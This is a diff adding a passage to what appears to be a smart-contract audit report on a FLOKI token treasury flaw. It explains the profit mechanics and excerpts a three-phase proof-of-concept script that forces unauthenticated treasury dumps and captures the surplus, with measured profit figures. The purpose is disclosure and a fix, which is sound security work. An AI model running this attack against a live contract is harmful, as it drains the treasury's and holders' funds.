@@ -105,6 +105,58 @@ Note: access control alone does **not** fix this — the treasury also dumps on 
 standard cross-transaction sandwich exploits the same `amountOutMin = 0` without ever calling
 `beforeTransferHandler`.
 
+### Profitability — value is captured directly, no short-selling required
+This is the important economic point for triage: the attacker profits in a **single atomic
+transaction, holding no position and making no directional price bet.** Short-selling is *not*
+required.
+
+A pure self-sandwich (sell, then buy back) loses money — two 0.3% LP fees. What makes this profitable
+is that the **treasury's forced dumps push the price down further than the attacker's own sells did**,
+so the buy-back returns *more* FLOKI than was sold. That surplus is the treasury's liquidated bag,
+extracted through the pool and realised as ETH in the same transaction. By conservation: the treasury
+converts its bag into ~74 ETH when a fair sale was ~83 ETH; the ~9 ETH gap remains in the pool and the
+attacker's buy-back is what captures it (LPs take the fee share). The attacker ends **ETH-neutral
+with a positive FLOKI surplus**, immediately liquidatable.
+
+Short-selling is only relevant as an *optional amplifier* (the attack depresses spot ~30–50%, so a
+pre-positioned perp short is extra profit on top) — never as the core mechanism. The related dust
+freeze (Finding 2) is different: on its own it is denial-of-service (value destruction), and
+monetising it *does* require an external short or extortion; it is not a self-contained profit vector.
+
+**Attacker PoC (excerpt from `audit/poc/floki_poc.py`, which reproduces this deterministically):**
+
+```python
+# PHASE 1: depress the price with split sells, each ≤ 3% of the pool (stay in the 3% tax tier).
+#          Each sub-sell ALSO forces a treasury tranche out via the pre-transfer hook.
+chunk = (reserve_floki * 299) // 10000
+while attacker_balance >= chunk and price > 0.5 * start_price:
+    s.sell(ATTACKER, chunk)                       # amountOutMin = 0 — attacker doesn't care
+
+# PHASE 2: hammer the UNAUTHENTICATED trigger to force the remaining bag out at the floor.
+while treasury_balance > 0:
+    try:
+        s.force_treasury_dump()                   # treasury.beforeTransferHandler(0, pool, 0)
+    except Revert:
+        break                                     # remaining bag is now dust → stop (see Finding 2)
+
+# PHASE 3: buy back with every wei raised — ETH-neutral round trip; keep the FLOKI surplus.
+s.buy(ATTACKER, eth_raised)
+
+surplus = attacker_balance - starting_inventory   # > 0  → the treasury's liquidated value
+assert abs(attacker_eth_delta) <= 1               # ETH-neutral: no position, no short
+assert surplus > 0                                # direct, realisable profit
+```
+
+Measured result (pool 500B FLOKI / 500 ETH, treasury bag = 20% of pool), reproducible via
+`python3 audit/poc/floki_poc.py`:
+
+```
+Finding 1  non-exempt attacker : treasury loses  8.50 ETH (10%), attacker profit ~ 5.27 ETH
+Finding 1  exempt attacker     : treasury loses 10.62 ETH (13%), attacker profit ~10.11 ETH
+```
+
+Magnitude scales with the treasury bag and pool size; the attack repeats each time tax re-accumulates.
+
 ### Recommended fix
 Both are required:
 1. Restrict the hooks to the token: `require(msg.sender == address(token))`.
